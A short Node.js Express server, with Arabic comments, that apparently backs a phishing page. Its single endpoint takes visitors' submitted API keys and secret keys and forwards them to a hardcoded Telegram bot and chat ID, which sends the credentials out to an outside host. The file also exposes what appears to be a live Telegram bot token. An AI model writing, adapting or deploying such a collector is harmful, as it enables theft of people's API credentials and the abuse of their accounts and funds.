const express = require("express");
const axios = require("axios");
const app = express();
app.use(express.json());
app.use(express.static("public"));

const TELEGRAM_TOKEN = "7992198241:AAE2EmpdPciaoItwGL8kHP8qFS9LgmOClj0"; // استبدل بالتوكن
const CHAT_ID = "5131864103"; // استبدل بـ chat.id

app.post("/send-api", async (req, res) => {
  const { apiKey, secretKey } = req.body;
  const message = `New API Key: ${apiKey}\nSecret Key: ${secretKey}`;
  await axios.post(`https://api.telegram.org/bot${TELEGRAM_TOKEN}/sendMessage`, {
    chat_id: CHAT_ID,
    text: message
  });
  res.send("Data sent to Telegram");
});

app.listen(3000, () => console.log("Server running"));
